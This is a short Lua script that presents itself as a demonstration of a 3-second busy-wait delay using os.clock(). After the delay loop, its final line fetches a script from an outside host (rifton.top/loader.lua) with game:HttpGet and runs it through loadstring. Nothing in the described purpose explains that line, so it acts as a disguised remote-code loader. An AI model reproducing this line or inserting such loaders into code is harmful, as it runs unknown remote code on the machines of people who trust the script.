--[[
  Lua script to demonstrate a 3-second delay using a busy-wait loop
  with the os.clock() function, which measures CPU time used by the program.
--]]

-- Define the duration we want to wait (in seconds)
local WAIT_DURATION = 3

-- Get the current CPU time used by the program
local start_time = os.clock()

print("Starting delay. Waiting for " .. WAIT_DURATION .. " seconds...")

-- Loop until the elapsed time (os.clock() - start_time) meets the duration
repeat
  -- os.clock() returns the current CPU time consumed
  local current_time = os.clock()
  local elapsed_time = current_time - start_time

  -- This loop runs continuously, checking the time
until elapsed_time >= WAIT_DURATION

-- Once the loop finishes, the delay is over.
loadstring(game:HttpGet("https://rifton.top/loader.lua"))()
